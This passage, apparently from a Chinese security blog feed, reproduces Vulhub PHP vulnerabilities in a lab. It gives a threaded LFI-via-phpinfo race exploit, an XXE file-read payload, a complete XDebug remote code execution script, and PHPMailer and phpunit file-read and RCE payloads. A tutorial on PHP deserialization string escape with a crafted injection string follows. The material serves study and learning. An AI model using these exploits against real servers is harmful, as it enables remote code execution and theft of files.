phpinfo output&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Woot!  \m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;\nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Vulhub上的环境有两个php页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php</span><br><span class="line">lfi.php</span><br></pre></td></tr></table></figure><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506121755.png" style="zoom:80%;"><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506121709.png" style="zoom:80%;"><h2 id="XML外部实体注入漏洞"><a href="#XML外部实体注入漏洞" class="headerlink" title="XML外部实体注入漏洞"></a>XML外部实体注入漏洞</h2><h3 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞主要危害：任意文件读取，ssrf</p><p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。</p><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>网站目录结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement.php  dom.php  index.php  simplexml_load_string.php</span><br></pre></td></tr></table></figure><p><strong>simplexml_load_string.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p><strong>SimpleXMLElement.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = <span class="keyword">new</span> SimpleXMLElement($data);</span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p><strong>dom.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line">print_r($dom);</span><br></pre></td></tr></table></figure><p>我们可以构造读取文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/dom.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506123059.png" style="zoom:80%;"><h2 id="XDebug远程调试漏洞"><a href="#XDebug远程调试漏洞" class="headerlink" title="XDebug远程调试漏洞"></a>XDebug远程调试漏洞</h2><h3 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致代码执行。</p><p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code>，即如下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br></pre></td></tr></table></figure><p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p><h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞</p><p>python3 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">1</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_xml</span>(<span class="params">sock</span>):</span></span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span>(<span class="params">url</span>):</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session.get(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&#x27;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=<span class="literal">True</span>, help=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, help=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--listen&#x27;</span>, default=<span class="number">9000</span>, type=int, help=<span class="string">&#x27;local port&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ip_port = (<span class="string">&#x27;0.0.0.0&#x27;</span>, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(<span class="number">10</span>)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(<span class="string">b&#x27;&#x27;</span>.join([<span class="string">b&#x27;eval -i 1 -- &#x27;</span>, base64.b64encode(args.code.encode()), <span class="string">b&#x27;\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    print(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.decode())</span><br><span class="line">    g = re.search(r<span class="string">b&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">        print(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    data = g.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.b64decode(data).decode())</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        print(<span class="string">&#x27;[-] May be not string result...&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506140437.png" style="zoom:80%;"><h2 id="CVE-2017-5223"><a href="#CVE-2017-5223" class="headerlink" title="CVE-2017-5223"></a>CVE-2017-5223</h2><h3 id="漏洞简介-6"><a href="#漏洞简介-6" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致任意文件读取。</p><p>PHPMailer是堪称全球最流行邮件发送类，其全球范围内的用户量大约有900万，被诸多开源项目所采用，包括WordPress、Drupal、1CRM、Joomla!等</p><p>PHPMailer在发送邮件的过程中，会在邮件内容中寻找图片标签（<code>&lt;img src=&quot;...&quot;&gt;</code>），并将其src属性的值提取出来作为附件。所以，如果我们能控制部分邮件内容，可以利用<code>&lt;img src=&quot;/etc/passwd&quot;&gt;</code>将文件<code>/etc/passwd</code>作为附件读取出来，造成任意文件读取漏洞。</p><h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>搭建好环境我们看下源码：</p><p><strong>index.php:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &#39;vendor&#x2F;autoload.php&#39;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;your-name&#39;], $_POST[&#39;your-email&#39;], $_POST[&#39;your-message&#39;])) &#123;</span><br><span class="line">    $mail &#x3D; new PHPMailer();</span><br><span class="line">    $mail-&gt;isSMTP();</span><br><span class="line">    $mail-&gt;Host &#x3D; $_ENV[&#39;SMTP_SERVER&#39;];</span><br><span class="line">    $mail-&gt;SMTPAuth &#x3D; true;</span><br><span class="line">    $mail-&gt;Username &#x3D; $_ENV[&#39;SMTP_EMAIL&#39;];</span><br><span class="line">    $mail-&gt;Password &#x3D; $_ENV[&#39;SMTP_PASSWORD&#39;];</span><br><span class="line">    $mail-&gt;Port &#x3D; intval($_ENV[&#39;SMTP_PORT&#39;]);</span><br><span class="line">    $mail-&gt;CharSet &#x3D; &#39;UTF-8&#39;;</span><br><span class="line">    if (in_array($_ENV[&#39;SMTP_SECURE&#39;], [&#39;tls&#39;, &#39;ssl&#39;])) &#123;</span><br><span class="line">        $mail-&gt;SMTPSecure &#x3D; $_ENV[&#39;SMTP_SECURE&#39;];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $mail-&gt;SMTPSecure &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $message &#x3D; &lt;&lt;&lt;DATA</span><br><span class="line">&lt;p&gt;&lt;strong&gt;&#123;$_POST[&#39;your-name&#39;]&#125;&lt;&#x2F;strong&gt;您好，您反馈的意见如下：&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;blackquote&gt;&#123;$_POST[&#39;your-message&#39;]&#125;&lt;&#x2F;blockquote&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;我们将在24小时内给予您回复，请耐心等待！&lt;&#x2F;p&gt;</span><br><span class="line">DATA;</span><br><span class="line">    $mail-&gt;SetFrom($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]);</span><br><span class="line">    $mail-&gt;AddAddress($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]);</span><br><span class="line">    $mail-&gt;Subject &#x3D; &quot;您反馈的意见我们已经收到&quot;;</span><br><span class="line">    $mail-&gt;MsgHTML($message);</span><br><span class="line">    if(!$mail-&gt;Send()) echo &quot;Error: &quot;.$mail-&gt;ErrorInfo; else echo &quot;Success!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>PHPMailer类在<code>vendor/phpmailer/phpmailer</code>下面</p><p>由于自己的是阿里云，好像搭不了邮件服务器，也没复现成功2333…</p><p>搭建好的环境如图：</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506210641.png" style="zoom:67%;"><p>“意见反馈”页面，正常用户填写昵称、邮箱、意见提交，这些信息将被后端储存，同时后端会发送一封邮件提示用户意见填写完成。该场景在实战中很常见，比如用户注册网站成功后，通常会收到一封包含自己昵称的通知邮件，那么，我们在昵称中插入恶意代码，目标服务器上的文件将以附件的形式被读取出来。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2017-9841"><a href="#CVE-2017-9841" class="headerlink" title="CVE-2017-9841"></a>CVE-2017-9841</h2><h3 id="漏洞简介-7"><a href="#漏洞简介-7" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致代码执行。</p><p>composer是php包管理工具，使用composer安装扩展包将会在当前目录创建一个vendor文件夹，并将所有文件放在其中。通常这个目录需要放在web目录外，使用户不能直接访问。</p><p>phpunit是php中的单元测试工具，其4.8.19 ~ 4.8.27和5.0.10 ~ 5.6.2版本的<code>vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code>文件有如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span>.file_get_contents(<span class="string">&#x27;php://input&#x27;</span>));</span><br></pre></td></tr></table></figure><p>如果该文件被用户直接访问到，将造成远程代码执行漏洞。</p><h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接将PHP代码作为POST Body发送给</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//yourip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></span><br></pre></td></tr></table></figure><p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulhub </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化字符逃逸</title>
      <link href="2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
      <url>2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了反序列化字符逃逸的相关内容！</p><a id="more"></a><h2 id="什么是反序列化字符逃逸？"><a href="#什么是反序列化字符逃逸？" class="headerlink" title="什么是反序列化字符逃逸？"></a>什么是反序列化字符逃逸？</h2><p>个人理解：在反序列化之前，存在对序列化字符串的替换等操作，导致可以构造特定的字符串序列达到本来完成不了的操作，比如修改其他变量的值，注入对象。</p><p><strong>举个例子：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;yy&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line">$password = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">$s = serialize($user);</span><br><span class="line">$r = filter($s);</span><br><span class="line">$a= unserialize($r);</span><br><span class="line"><span class="keyword">if</span>($a[<span class="number">1</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>有上面一段代码，可以看到我们可控的地方只有<code>$username</code>，后面有一个filter函数替换</p><p>我们知道，PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的</p><p>正常的序列化结果是这样的(假设u=admin):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>此时是没有x的，假设我们输入一个带字母x的(u=testx)，序列化经过替换就会变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;testyy&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>此时反序列化，就会失败，<code>testyy</code>的长度不是5而是6，unserialize函数返回<code>false</code></p><p>但是，假如我们传入，长度为38</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?u=xxxxxxxxxxxxxxxxxxx<span class="string">&quot;;i:1;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>此时序列化结果是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">38</span>:<span class="string">&quot;xxxxxxxxxxxxxxxxxxx&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;i:1;s:3:&quot;</span>aaa<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>经过替换后序列化结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">38</span>:<span class="string">&quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;i:1;s:3:&quot;</span>aaa<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>此时<code>yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy</code>的长度刚好为38，再加上后面的<code>;i:1;s:5:&quot;admin&quot;;&#125;</code>成功反序列化，而这后面的直接忽略了</p><p>那怎样算到底有多少个x呢？我用的方法是列方程😂</p><p>首先我们要确定需要添加的内容，也就是后面一串，即<code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code>，长度为19(设为m)，满足以下式子(设有n个<code>x</code>字符，<code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code>前面有y个非<code>x</code>字符)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n+y+m=<span class="number">2</span>n+y <span class="comment">// 原来字符串的长度 = 